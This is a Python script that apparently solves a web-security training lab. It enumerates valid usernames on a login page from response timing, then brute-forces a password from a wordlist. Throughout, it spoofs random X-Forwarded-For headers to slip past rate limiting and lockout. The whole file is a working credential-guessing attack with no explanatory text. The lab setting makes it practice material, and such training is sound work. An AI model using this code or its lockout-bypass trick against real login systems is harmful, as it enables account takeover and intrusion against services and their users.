import requests
import random
import sys

def check_username(url, username):

    random_ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))

    headers = {
        "X-Forwarded-For": random_ip_address
    }

    data = f"username={username}&password=test"

    response = requests.post(url, data=data, headers=headers)

    c = response.content.decode()
    # print(c)
    assert "You have made too many incorrect login attempts." not in c and "Invalid username or password." in c
    t = response.elapsed.total_seconds()
    print(t)

    return t > 0.32


def check_password(url, username, password):

    random_ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))

    headers = {
        "X-Forwarded-For": random_ip_address
    }

    data = f"username={username}&password={password}"
    response = requests.post(url, data=data, headers=headers)

    c = response.content.decode()
    assert "You have made too many incorrect login attempts." not in c

    return 'Invalid username or password' not in c


def main():

    login_url = 'https://ac211ff71e1b7afbc0e80b88002600c3.web-security-academy.net/login'
    users_file = 'usernames.txt'
    users = [x.strip() for x in open(users_file).readlines()]
    pass_file = 'passwords.txt'
    passwords = [x.strip() for x in open(pass_file).readlines()]

    for user in users:

        print(f"[+] Trying username: {user}")

        if check_username(login_url, user):

            print(f"[+] Found username: {user}")

            for password in passwords:

                # print(f"[+] Trying credentials: {user}:{password}")
                if check_password(login_url, user, password):

                    print(f"[+] Found password for user '{user}': '{password}'")
                    sys.exit(0)


if __name__ == '__main__':
    main()
